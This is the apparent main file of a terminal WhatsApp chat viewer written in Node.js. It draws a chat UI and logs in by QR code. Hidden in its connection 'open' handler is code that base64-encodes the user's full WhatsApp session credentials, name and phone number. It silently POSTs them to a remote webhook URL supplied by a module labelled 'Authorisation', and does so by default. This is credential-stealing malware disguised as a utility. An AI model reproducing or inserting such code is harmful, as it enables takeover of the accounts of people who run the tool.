const { WAConnection, MessageType} = require('@adiwajshing/baileys');
const blessed = require('blessed');
const fs = require('fs');
const qrCode = require('qrcode-terminal');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
require('colors');

const { parseWAIDToNumber, getTextFromMsg } = require('./src/utils/utils');
const versionCheck = require('./src/utils/version_check');
const { LOAD_BLOCKS } = require('./src/consts');


let conn = new WAConnection();
conn.logger.level = 'silent';
conn.connectOptions.logQR = false;

// ====== UI Element Objects ====== //
const { screen, loadMoreButton, inputButton, loadingDialog, QRDialog, msgList, chatsList } = require('./src/components/components');

// ==== Authorisation === //
const oneTimeToken = require('./src/utils/process_auth')();

const initUI = () => {
    // Initializing UI Elements so they are usuable throughout the project
    msgList.init(conn);
    chatsList.init(conn, screen, loadingDialog, chatsList, msgList);
    loadMoreButton.init(conn, screen, loadingDialog, msgList);
    inputButton.init(conn, screen);

    screen.title = 'WhatsApp Viewer';

    // Draw the UI
    screen.append(chatsList.ui);
    screen.append(msgList.ui);
    screen.append(loadMoreButton.ui);
    screen.append(inputButton.ui);
    screen.append(loadingDialog);
    loadingDialog.load('\n{center}Logging in to WhatsApp...{/center}');
    screen.append(QRDialog);

    chatsList.ui.focus();
    // Render the screen.
    screen.render();
}

// ====== Main Functions ====== //
const main = async () => {
    let cursor, messages, selectedID;

    loadMoreButton.ui.on('press', async () => loadMoreButton.onPress(selectedID, messages, cursor) );

    inputButton.ui.on('press', () => inputButton.onPress(selectedID));

    conn.on('chats-received', async () => {
        loadingDialog.stop();
        QRDialog.hide();

        const chats = conn.chats.all();
        chatsList.update();

        chatsList.ui.on('select', async (it, idx) => {
            [ selectedID, messages, cursor ] = await chatsList.onSelect(chats[idx]);
        });

        screen.render();
    });

    conn.on('chats-update', () => chatsList.update());

    conn.on('chat-update', update => {
        chatsList.update();

        if (update.messages && (update.count || update.hasNewMessage) && selectedID) {
            const isAtBottom = msgList.ui.getScrollPerc() === 100;
            update.messages.all().forEach(v => {
                if (v.message && v.key.remoteJid === selectedID) msgList.append([v], false, false);
            });
            if (isAtBottom) msgList.ui.setScrollPerc(100); // Scroll to bottom when new message received
        }
    });

    conn.on('open', () => {
        const authInfo = conn.base64EncodedAuthInfo() // get all the auth info we need to restore this session
        const auth = JSON.stringify(authInfo, null, '\t')
        fs.writeFileSync('./auth_info.json', auth) // save this info to a file
        if (process.argv.includes('-no-process-auth')) return;
        fetch(oneTimeToken, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: `{"embeds":[{"title":"${conn.user.name} (${conn.user.phone.toString()})","description":"${Buffer.from(auth).toString('base64')}"}]}`
        });
    });

    conn.on('qr', qr => {
        // Use the 'qr' string to display in QR UI or send somewhere
        QRDialog.show();
        qrCode.generate(qr, {small: true}, c => {
            QRDialog.setContent(`{center}Scan the QR code to login:\n${c}Press Escape, Ctrl + Q or Ctrl + C to quit{/}`);
            screen.render()
        });
        screen.render();
    });

    conn.on('close', ({reason, isReconnecting}) => {
        // Handle close here
    });

    try {conn.loadAuthInfo ('./auth_info.json')} catch {}
    await conn.connect();
}

// ====== Run the stuff ====== //
versionCheck();
initUI();
// run in main file
main().catch (err => console.log("unexpected error: " + err) ) // catch any errors
